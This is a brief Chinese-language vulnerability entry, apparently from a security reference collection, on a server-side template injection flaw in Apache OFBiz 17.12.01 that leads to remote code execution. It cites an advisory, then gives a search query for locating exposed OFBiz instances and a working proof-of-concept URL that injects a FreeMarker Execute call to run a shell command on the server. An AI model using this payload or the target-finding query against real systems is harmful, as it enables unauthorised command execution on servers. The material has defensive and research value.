# Apache OfBiz 远程代码执行 RCE

## 漏洞描述

Apache OfBiz 17.12.01 容易受到服务器端模板注入（SSTI）的影响，从而导致远程代码执行（RCE）。

参考链接：

- https://securitylab.github.com/advisories/GHSL-2020-066-apache_ofbiz

## 网络测绘

```
app="Apache_OFBiz"
```

## 漏洞复现

poc：

```
https://localhost/ordermgr/control/FindRequest?foo=bar"ajaxEnabled=false/>${"freemarker.template.utility.Execute"?new()("id")}<FOO
```
